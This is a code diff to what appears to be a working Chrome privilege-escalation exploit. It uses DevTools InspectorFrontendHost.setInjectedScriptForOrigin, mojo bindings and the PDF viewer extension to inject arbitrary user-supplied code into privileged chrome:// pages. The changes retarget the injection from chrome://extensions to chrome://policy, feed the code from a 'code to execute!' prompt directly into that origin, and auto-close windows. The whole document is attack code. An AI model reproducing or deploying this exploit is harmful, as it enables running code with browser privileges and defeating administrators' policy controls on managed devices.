@@ -87,8 +87,8 @@
                     }
                     await writeFile('index.js', atob(`%%EXTJS%%`))
                     const url = await writeFile('index.html', `${atob('%%EXTHTML%%')}<script src="./index.js"></script>`);
-                    // w.close();
                     w.chrome.tabs.create({ url });
+                    w.close();
                     cleanup();
                 });
 
@@ -108,7 +108,8 @@
             document.title = "Dashboard";
             document.querySelector('#activate2').onclick = function (ev) {
 
-                function xd() {
+                function xd(w) {
+                    w.close();
                     const pdfId = "mhjfbmdgcfjbbpaeojofohoefgiehjai"; // Redefinition because we convert this function to a string
                     const mojoURL = "chrome://resources/mojo/mojo/public/js/bindings.js";
                     chrome.tabs.getCurrent(function (tab) {
@@ -135,13 +136,16 @@
 
                                 }
                                 const htmlFile = `<html>
-                                <head></head><body><iframe src="chrome://extensions"></iframe>
+                                <head></head><body><iframe src="blob:chrome://policy/f6e82603-005a-40f0-a200-231bcf14eca4"></iframe>
                                 </html>
                                 
                                 `
                                 
                                 // alert(url);
                                 opener.postMessage({ url: URL.createObjectURL(new Blob([htmlFile], {type: "text/html"})) }, '*');
+                                setTimeout(function () {
+                                    close();
+                                }, 800);
                             }
                             chrome.tabs.executeScript(info.tabs[0].id, { code: `(${createAndWriteFile.toString()})()` });
                             function m2(url) {
@@ -149,7 +153,7 @@
                                 onmessage = function (data) {
                                     if (data.data.type === "ack") {
                                         // chrome.tabs.getCurrent(function (tab) {
-                                            alert("navigating");
+                                            // alert("navigating");
                                             chrome.tabs.update(tab.id, { url })
                                         // })
                                     }
@@ -193,7 +197,7 @@
                 if (d.data.type === "acc") {
                     onunload = function () { while (true); };
                     d.source.postMessage({ type: "ack" }, '*');
-                    InspectorFrontendHost.setInjectedScriptForOrigin('chrome://extensions', 'alert(1)//');
+                    
                 };
 
                 if (!globalMap[d.data.uid]) return;
@@ -221,7 +225,11 @@
                 if (x === pdfId) {
                     path = "index.html"; // pdf viewer hack
                     is_pdf = true;
-                    injected = injected.replace('%%CHROMEPAYLOAD%%', btoa(prompt("code to execute!")));
+                    const b = prompt("code to execute!");
+                    if (!b) return;
+                    injected = injected.replace('%%CHROMEPAYLOAD%%', btoa(b));
+                    InspectorFrontendHost.setInjectedScriptForOrigin('chrome://policy', b+'//');
+                    
                 }
                 const URL_1 = `chrome-extension://${x ??
                     alert("NOTREACHED")}/${path}`;
